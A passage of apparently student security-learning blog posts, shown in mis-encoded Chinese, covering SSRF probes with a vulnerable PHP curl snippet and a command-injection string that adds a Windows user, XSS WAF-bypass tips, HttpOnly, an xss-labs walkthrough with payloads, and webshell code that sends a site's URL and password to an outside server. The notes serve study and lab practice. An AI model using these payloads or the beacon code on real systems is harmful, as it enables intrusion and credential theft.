æœåŠ¡ç«¯çš„è¯·æ±‚å‘èµ·æ”»å‡»ï¼Œæ”»å‡»è€…å€Ÿç”±æœåŠ¡ç«¯ä¸ºè·³æ¿æ¥æ”»å‡»ç›®æ ‡ç³»ç»Ÿã€‚ SSRFæ¼æ´å±å®³åˆ©ç”¨SSRFå¯ä»¥è¿›è¡Œå†…å¤–ç½‘çš„ç«¯å£å’ŒæœåŠ¡æ¢æµ‹ã€ä¸»æœºæœ¬åœ°æ•æ„Ÿæ•°æ®çš„è¯»å–ã€å†…å¤–ç½‘ä¸»æœºåº”ç”¨ç¨‹åºæ¼æ´çš„åˆ©ç”¨ç­‰ç­‰ã€‚ æ¼æ´å­˜åœ¨å…·ä½“å¯èƒ½å‡ºç°SSRFçš„åœ°æ–¹ï¼š 1.ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º 2.è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ 3.åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹ 4.å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ 5.å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦ç½‘ç«™ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨æˆ·ä½“éªŒ 6.äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡ŒSSRFæµ‹è¯• 7.ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ 8.æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•° 9.é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€ 10.ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰ 11.æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ï¼Œä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦ 12.ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰ æœ¬åœ°ä¸Šä¼ æœ¬åœ°ä¸Šä¼ å°±æ˜¯é€šè¿‡å°†è‡ªå·±æœ¬åœ°çš„èµ„æºä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š è¿œç¨‹ä¸Šä¼ è¿œç¨‹ä¸Šä¼ å°±æ˜¯é€šè¿‡è¿œç¨‹åœ°å€æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œå¯¹æ–¹éœ€è¦è¯·æ±‚è¿œç¨‹åœ°å€ã€‚ SSRFåŸç†SSRFå­˜åœ¨äºè¿œç¨‹ä¸Šä¼ æˆ–è€…è¿œç¨‹åŠ è½½çš„åœ°æ–¹ï¼ŒæœåŠ¡å™¨ä¼šå¯¹æˆ‘ä»¬çš„è¿œç¨‹åœ°å€è¿›è¡Œè¯·æ±‚ï¼Œå¦‚æœæˆ‘ä»¬å°†è¯¥æœåŠ¡å™¨çš„è¿œç¨‹è®¿é—®åœ°å€ä¿®æ”¹ä¸º127.0.0.1:ç«¯å£ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šå¯¹è‡ªå·±çš„ç«¯å£è¿›è¡Œæ¢æµ‹ã€‚ å„ä¸ªåè®®è°ƒç”¨æ¢é’ˆ12http,file,dict,ftp,gopher ç­‰æ¼æ´æ”»å‡»ï¼šç«¯å£æ‰«æï¼ŒæŒ‡çº¹è¯†åˆ«ï¼Œæ¼æ´åˆ©ç”¨ï¼Œå†…ç½‘æ¢é’ˆç­‰ 1234http://192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21 è¿™é‡Œæ¼”ç¤ºçš„æ˜¯fileåè®®ï¼Œé€šè¿‡è¯¥åè®®å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ ä¸åŒç±»å‹ç½‘ç«™æ”¯æŒåè®® SSRFæ¼æ´ä»£ç æµ‹è¯•12345678910111213141516171819202122232425262728&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;è¯·è¾“å…¥å›¾ç‰‡åœ°å€ï¼š&lt;input type=&#x27;text&#x27; name=&#x27;url&#x27;&gt;&lt;input type=&#x27;submit&#x27; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;?php/*$url=$_POST[&#x27;url&#x27;];$img =file_get_contents(&#x27;http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.&#125;&#x27;);echo $url;echo $img;//header(&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;);//echo $img;//$file=fopen(&#x27;x.png&#x27;,&#x27;w+&#x27;);//fwrite($file,$img);//fclose($file);*/?&gt;&lt;?php$_POST[&#x27;url&#x27;];$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST[&#x27;url&#x27;]);curl_setopt($ch, CURLOPT_HEADER, false);curl_exec($ch);curl_close($ch);?&gt; å‚è€ƒèµ„æ–™12https://pan.baidu.com/s/1bp96ECJhttps://www.t00ls.net/articles-41070.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"CSRF","slug":"CSRF","permalink":"https://al0nez.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://al0nez.github.io/tags/SSRF/"}]},{"title":"28WEBæ¼æ´-XSSè·¨ç«™ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤","slug":"28WEBæ¼æ´-XSSè·¨ç«™ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤","date":"2021-09-21T02:34:32.000Z","updated":"2021-09-21T06:00:53.882Z","comments":true,"path":"2021/09/21/28WEBæ¼æ´-XSSè·¨ç«™ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤/","link":"","permalink":"https://al0nez.github.io/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å¸¸è§„ WAF ç»•è¿‡æ€è·¯ æ ‡ç­¾è¯­æ³•æ›¿æ¢ 1ä½¿ç”¨ aæ ‡ç­¾ã€imgæ ‡ç­¾æ¥æ›¿æ¢script ç‰¹æ®Šç¬¦å·å¹²æ‰° 1#@!%&amp;/ç­‰ç­‰,ç‰¹æ®Šç¬¦å·è¿›è¡Œå¹²æ‰° æäº¤æ–¹å¼æ›´æ”¹ 1é€šè¿‡POSTã€GETæ–¹å¼è¿›è¡Œç»•è¿‡æäº¤ åƒåœ¾æ•°æ®æº¢å‡º 1åœ¨&lt;script&gt;alert(1)asjkhdsajkhdjakh&lt;/script&gt;åƒè¿™æ ·å°±æ˜¯åƒåœ¾æ•°æ® åŠ å¯†è§£å¯†ç®—æ³• 1é€šè¿‡å°†XSSè¯­å¥åŠ å¯†ç»•è¿‡ ç»“åˆå…¶ä»–æ¼æ´ç»•è¿‡ XSStrikeå·¥å…·XSStrike ä¸»è¦ç‰¹ç‚¹ åå°„å’Œ DOM XSS æ‰«æ å¤šçº¿ç¨‹çˆ¬è™« Contextåˆ†æ å¯é…ç½®çš„æ ¸å¿ƒ æ£€æµ‹å’Œè§„é¿WAF è€æ—§çš„ JS åº“æ‰«æ æ™ºèƒ½ payload ç”Ÿæˆå™¨ æ‰‹å·¥åˆ¶ä½œçš„ HTML &amp; JavaScriptè§£æå™¨ å¼ºå¤§çš„ fuzzingå¼•æ“ ç›²æ‰“ XSS æ”¯æŒ é«˜æ•ˆçš„å·¥ä½œæµ å®Œæ•´çš„ HTTPæ”¯æŒ Bruteforce payloads æ”¯æŒ Payload ç¼–ç  å‚æ•°12345678910111213141516171819202122-h, --help //æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯-u, --url //æŒ‡å®šç›®æ ‡ URL--data //POST æ–¹å¼æäº¤å†…å®¹-v, --verbose //è¯¦ç»†è¾“å‡º-f, --file //åŠ è½½è‡ªå®šä¹‰ paload å­—å…¸-t, --threads //å®šä¹‰çº¿ç¨‹æ•°-l, --level //çˆ¬è¡Œæ·±åº¦-t, --encode //å®šä¹‰ payload ç¼–ç æ–¹å¼--json //å°† POST æ•°æ®è§†ä¸º JSON--path //æµ‹è¯• URL è·¯å¾„ç»„ä»¶--seeds //ä»æ–‡ä»¶ä¸­æµ‹è¯•ã€æŠ“å– URL--fuzzer //æµ‹è¯•è¿‡æ»¤å™¨å’Œ Web åº”ç”¨ç¨‹åºé˜²ç«å¢™ã€‚--update //æ›´æ–°--timeout //è®¾ç½®è¶…æ—¶æ—¶é—´--params //æŒ‡å®šå‚æ•°--crawl //çˆ¬è¡Œ--proxy //ä½¿ç”¨ä»£ç†--blind //ç›²æµ‹è¯•--skip //è·³è¿‡ç¡®è®¤æç¤º--skip-dom //è·³è¿‡ DOM æ‰«æ--headers //æä¾› HTTP æ ‡å¤´-d, --delay //è®¾ç½®å»¶è¿Ÿ å®‰å…¨ä¿®å¤æ–¹æ¡ˆ å¼€å¯ httponly,è¾“å…¥è¿‡æ»¤ï¼Œè¾“å‡ºè¿‡æ»¤ç­‰ PHP:http://www.zuimoge.com/212.html JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html æ¶‰åŠèµ„æºï¼š https://gitee.com/yhtmxl/imxss/ https://github.com/3xp10it/xwaf https://xssfuzzer.com/fuzzer.html https://github.com/s0md3v/XSStrike https://bbs.pediy.com/thread-250852.htm https://github.com/TheKingOfDuck/fuzzDicts","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSSè·¨ç«™","slug":"XSSè·¨ç«™","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"27WEBæ¼æ´-XSSè·¨ç«™ä¹‹ä»£ç åŠhttponlyç»•è¿‡","slug":"27WEBæ¼æ´-XSSè·¨ç«™ä¹‹ä»£ç åŠhttponlyç»•è¿‡","date":"2021-09-21T02:34:10.000Z","updated":"2021-09-21T06:00:59.165Z","comments":true,"path":"2021/09/21/27WEBæ¼æ´-XSSè·¨ç«™ä¹‹ä»£ç åŠhttponlyç»•è¿‡/","link":"","permalink":"https://al0nez.github.io/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† HTTPOnlyä»€ä¹ˆæ˜¯HTTPOnlyï¼Ÿå¦‚æœæ‚¨åœ¨cookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡jsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»(æ”»å‡»æ‰‹æ³•)ï¼Œå…·ä½“ä¸€ç‚¹çš„ä»‹ç»è¯·googleè¿›è¡Œæœç´¢ å¼€å¯HTTPOnlyè¿™é‡Œåªä»‹ç»PHPå¦‚ä½•å¼€å¯ã€‚ PHP5.2ä»¥ä¸Šç‰ˆæœ¬å·²æ”¯æŒHttpOnlyå‚æ•°çš„è®¾ç½®ï¼ŒåŒæ ·ä¹Ÿæ”¯æŒå…¨å±€çš„HttpOnlyçš„è®¾ç½®ï¼Œåœ¨php.iniä¸­ 1session.cookie_httponly = è®¾ç½®å…¶å€¼ä¸º1æˆ–è€…TRUEï¼Œæ¥å¼€å¯å…¨å±€çš„Cookieçš„HttpOnlyå±æ€§ï¼Œå½“ç„¶ä¹Ÿæ”¯æŒåœ¨ä»£ç ä¸­æ¥å¼€å¯ï¼š 123&lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); // or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; Cookieæ“ä½œå‡½æ•°setcookieå‡½æ•°å’Œsetrawcookieå‡½æ•°ä¹Ÿä¸“é—¨æ·»åŠ äº†ç¬¬7ä¸ªå‚æ•°æ¥åšä¸ºHttpOnlyçš„é€‰é¡¹ï¼Œå¼€å¯æ–¹æ³•ä¸ºï¼š 12setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); å¯¹äºPHP5.1ä»¥å‰ç‰ˆæœ¬ä»¥åŠPHP4ç‰ˆæœ¬çš„è¯ï¼Œåˆ™éœ€è¦é€šè¿‡headerå‡½æ•°æ¥å˜é€šä¸‹äº†ï¼š 1&lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;); ?&gt; ä½œç”¨é˜²æ­¢XSSè¯»å–cookieä¿¡æ¯ æ¼”ç¤ºå°†ä»£ç å†™å…¥æ–‡ä»¶ä¸­ 1ini_set(&quot;session.cookie_httponly&quot;, 1); å½“æˆ‘ä»¬æ˜¯ç”¨XSSè¯­å¥è¿›è¡Œç›—å–Cookieæ—¶ï¼Œè¿™é‡Œç›´æ¥å°†XSSä»£ç å†™åˆ°ä»£ç ä¸­ã€‚ ç„¶åå»æŸ¥çœ‹XSSå¹³å°ï¼Œå¯ä»¥çœ‹åˆ°Cookieæ²¡æœ‰è¢«è¿”å› ç»•è¿‡HttpOnlyå¼€å¯HttpOnlyåªä¼šé˜²æ­¢æˆ‘ä»¬è¯»å–Cookieï¼Œè€Œä¸ä¼šä½¿æˆ‘ä»¬XSSè¯­å¥å¤±æ•ˆã€‚å¦‚æœå¯¹æ–¹å¼€å¯äº†HttpOnlyã€‚é™¤äº†å¯ä»¥é€šè¿‡è·å–Cookieæ¥è¿›è¡Œç™»å½•ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡è´¦å·å’Œå¯†ç è¿›è¡Œç™»å½•ã€‚ ä¿å­˜è¯»å– å¦‚æœå¯¹æ–¹åœ¨è¿›è¡Œè´¦å·å¯†ç ç™»å½•åï¼Œè¿›è¡Œäº†æµè§ˆå™¨ä¿å­˜ã€‚æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨XSSè¿›è¡Œæµè§ˆå™¨è´¦å·å¯†ç è¯»å–ã€‚ æœªä¿å­˜è¯»å– å¦‚æœå¯¹æ–¹åœ¨è¿›è¡Œè´¦å·å¯†ç ç™»å½•åï¼Œæ²¡æœ‰è¿›è¡Œæµè§ˆå™¨ä¿å­˜ã€‚æˆ‘ä»¬å¯ä»¥é‡‡ç”¨è¡¨å•åŠ«æŒçš„æ–¹å¼ï¼Œå°†å¯¹æ–¹è¾“å…¥çš„è´¦å·å¯†ç ï¼Œå‘é€ä¸€ä»½ç»™æˆ‘ä»¬ã€‚è¿™ä¸ªæ”»å‡»æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œç™»å½•é¡µé¢å¿…é¡»è¦æœ‰XSSæ¼æ´ã€‚ XSS-labsç¬¬ä¸€å…³1http://127.0.0.1/xss-labs/level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt; ç¬¬äºŒå…³æŸ¥çœ‹ä»£ç å‘ç°ã€‚ æºç PHP htmlspecialchars() å‡½æ•° æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ â€œ&lt;â€ ï¼ˆå°äºï¼‰å’Œ â€œ&gt;â€ ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“ã€‚ 1echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt; æ˜¾ç¤ºç»“æœå°†&lt;&gt;æ›¿æ¢æˆäº†&amp;lt;ï¼Œ 1&lt;h2 align=&quot;center&quot;&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alet(1)&amp;lt;script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt; ç»•è¿‡ æˆ‘ä»¬å‘ç°ä¸‹é¢ä¸€ä¸ªæ ‡ç­¾ä¸­è¿˜æœ‰ä¸€ä¸ªæˆ‘ä»¬å†™çš„jsè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‰é¢å†™ä¸Šâ€&gt;é—­åˆå‰é¢çš„ï¼Œå°±å¯ä»¥æ‰§è¡ŒXSSä»£ç äº†ã€‚ 1http://127.0.0.1/xss-labs/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; ç¬¬ä¸‰å…³é™¤äº†&lt;&gt;è¢«è¿‡æ»¤æ‰ä»¥åï¼Œâ€ä¹Ÿè¢«è¿‡æ»¤æ‰äº†ã€‚æˆ‘ä»¬åœ¨è¾“å…¥å’Œç¬¬äºŒå…³ä¸€æ ·çš„ä»£ç æ—¶ï¼ŒåŒå¼•å·è¢«ä»£ç å®ä¾‹åŒ–ã€‚ 1&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt; æºç 12echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚ é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š &amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp; â€œ ï¼ˆåŒå¼•å·ï¼‰æˆä¸º â€œ â€˜ ï¼ˆå•å¼•å·ï¼‰æˆä¸º â€˜ &lt; ï¼ˆå°äºï¼‰æˆä¸º &lt; &gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt; çŸ¥è¯†HTML onclick äº‹ä»¶å±æ€§ å½“ç‚¹å‡»æŒ‰é’®æ—¶æ‰§è¡Œä¸€æ®µ JavaScriptï¼š 1&lt;button onclick=&quot;copyText()&quot;&gt;Copy Text&lt;/button&gt; ç»•è¿‡12&#x27; onfocus=&#x27;javascript:alert(/xss/) #onfocusèšç„¦äº‹ä»¶&#x27; onfocus=&#x27;alert(/xss/) ç¬¬å››å…³å’Œç¬¬3å…³ä¸€æ · 1&quot; onfocus=&quot;javascript:alert(/xss/) ç¬¬äº”å…³å°†onè¿‡æ»¤äº†ï¼Œè¿‡æ»¤æˆo_näº† 1&lt;input name=&quot;keyword&quot; value=&quot;&quot; o_nfocus=&quot;javascript:alert(/xss/)&quot;&gt; ç»•è¿‡å°†XSSä»£ç å†™æˆè¶…é“¾æ¥å½¢å¼ 1&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt; ç¬¬å…­å…³å°†hrefè¿‡æ»¤äº†ï¼Œå¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ 1&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt; ç¬¬ä¸ƒå…³JavaScriptçš„scriptæ›¿æ¢ä¸ºç©ºäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åŒå†™ç»•è¿‡ã€‚ 1&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt; ç¬¬å…«å…³JavaScriptçš„scriptè¿‡æ»¤äº†ï¼Œå¤§å°å†™æ²¡ç»•è¿‡ï¼Œæ‰€ä»¥è€ƒè™‘ç¼–ç ç»•è¿‡ 1javas&amp;#99;ript:alert(/xss/) ç¬¬ä¹å…³//æ³¨é‡Šæ‰åé¢çš„http://www.baidu.comç»•è¿‡ 1javas&amp;#99;ript:alert(/xss/)//http://www.baidu.com ç¬¬åå…³éšè—æ–‡æœ¬æ¡†ï¼Œåªæœ‰ç¬¬ä¸‰ä¸ªæœ‰æ•ˆ 1http://127.0.0.1/xss-labs/level10.php?t_sort=&quot; type=&#x27;text&#x27; onfocus=&quot;alert(/xss/)&amp;submit=submit ç¬¬åä¸€å…³çŸ¥è¯† ç»•è¿‡æŠ“åŒ…ï¼Œå°†Refererå€¼ä¿®æ”¹ä¸ºpayloadä¾¿èƒ½é€šè¿‡è¿™ä¸€å…³ 1&quot; onfocus=&quot;alert(/xss/) ç¬¬åäºŒå…³æŠ“åŒ…ï¼Œæ”¹ä¸€ä¸‹UAå€¼ 1&quot; onfocus=&quot;alert(/xss/) ç¬¬åä¸‰å…³æŠ“åŒ…ä¿®æ”¹cookieå€¼ 1&quot; onfocus=&quot;alert(/xss/) ç¬¬åå››å…³å¥½åƒæ²¡å¾—ç¯å¢ƒï¼Œè¿™å…³åˆ©ç”¨çš„æ˜¯exifæ¼æ´ï¼Œçœ‹è¿™ä¸ªexifçš„æ–‡ç« å§ã€‚ https://blog.csdn.net/qq_32393893/article/details/104814749 ç¬¬åäº”å…³XSSä¸­æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ 1http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;&#x27; ç¬¬åå…­å…³ç¦æ‰äº†ç©ºæ ¼ï¼Œç”¨å›è½¦ä»£æ›¿%0d 1http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=123%0donerror=alert(1)&gt; ç¬¬åä¸ƒå…³ç«ç‹å’Œchromeå¾ˆä¸ä¸€æ ·ã€‚ã€‚ã€‚ã€‚chromeä¸Šå¯ä»¥ 1http://127.0.0.1/xss-labs/level17.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1) ç¬¬åå…«å…³ä¸€æ ·ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ 1http://127.0.0.1/xss-labs/level18.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1) ç¬¬åä¹å…³flash XSS chromeéƒ½æŠŠflashç¦äº†ï¼Œè¢«æ·˜æ±°äº†è¿™flashï¼Œä¸åšäº†ä¸åšäº†ã€‚(å®é™…æ˜¯å› ä¸ºæ‡’) ç¬¬äºŒåå…³ä¸€æ ·æ‡’","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSSè·¨ç«™","slug":"XSSè·¨ç«™","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"26WEBæ¼æ´-XSSè·¨ç«™ä¹‹è®¢å•åŠShellç®±å­åæ€è®°","slug":"26WEBæ¼æ´-XSSè·¨ç«™ä¹‹è®¢å•åŠShellç®±å­åæ€è®°","date":"2021-09-21T02:33:56.000Z","updated":"2021-09-21T06:01:05.567Z","comments":true,"path":"2021/09/21/26WEBæ¼æ´-XSSè·¨ç«™ä¹‹è®¢å•åŠShellç®±å­åæ€è®°/","link":"","permalink":"https://al0nez.github.io/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† Postmanæµ‹è¯•XSSè¿”å›çš„cookieæ˜¯å¦æ­£å¸¸ï¼Œä½¿ç”¨è¯¥å·¥å…· ä¸‹è½½1https://www.postman.com/downloads/ å®‰è£…1https://blog.csdn.net/weixin_43184774/article/details/100578557 ä½¿ç”¨ WEB SHELLç®±å­å½“ä½ å…¥ä¾µäº†åˆ«äººçš„ç½‘ç«™ï¼Œå†™å…¥å¤§é©¬æˆ–è€…å…¶ä»–æœ¨é©¬ï¼Œè¯¥æœ¨é©¬ä¼šè‡ªåŠ¨å°†ç½‘ç«™åœ°å€å’Œæœ¨é©¬çš„ç™»å½•å¯†ç å‘é€åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œè¿™ç§å°±å«åšWEB SHELLç®±å­ã€‚ ä»£ç è¿™åªæ˜¯ä¸€ç§å†™æ³•ï¼Œè¿˜æœ‰å¾ˆå¤šç§ã€‚å°†ä»£ç å†™åˆ°å¤§é©¬ä¸­ï¼Œç„¶åå½“å¤§é©¬è¢«è®¿é—®çš„æ—¶å€™ã€‚ 12$url=$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;];echo &quot;&lt;script src=&#x27;http://192.168.1.56/api.asp?url=$url&amp;pass=$password&#x27;&gt;&quot;; å¤ç° å¯ä»¥çœ‹åˆ°å‘é€äº†ä¸€ä¸ªè¯·æ±‚ã€‚å½“ä½ æ’å…¥è¿™ä¸ªä¸€å¥è¯æœ¨é©¬åœ¨æŸä¸ªç½‘é¡µï¼Œå®ƒä¼šå‘é€è¿™ä¸ªç½‘é¡µçš„urlä»¥åŠä¸€å¥è¯æœ¨é©¬çš„å¯†ç åˆ°åé—¨æœåŠ¡å™¨ webshellç®±å­å·²ç»æ‹¿åˆ°äº†åœ°å€å’Œå¯†ç ï¼Œé€šè¿‡å®ƒå°±å¯ä»¥ç™»å½•è¿›å»ã€‚ åæ€å½“æˆ‘ä»¬æ‰¾åˆ°åé—¨æœåŠ¡å™¨çš„åœ°å€åï¼Œå¯ä»¥é€šè¿‡æ’å…¥XSSè¯­å¥æ¥åæ€åé—¨ å¤ç°æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å¯†ç ä¿®æ”¹ä¸ºXSSä»£ç ï¼Œç›—å–cookie 1http://192.168.1.56/api.asp?url=www.baidu.con/1.php&amp;pass=&lt;script&gt;alert(1)&lt;/script&gt; æˆåŠŸæ‰§è¡ŒXSSä»£ç  å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªxssä»£ç æ”¹ä¸ºè·å–cookieçš„ä»£ç 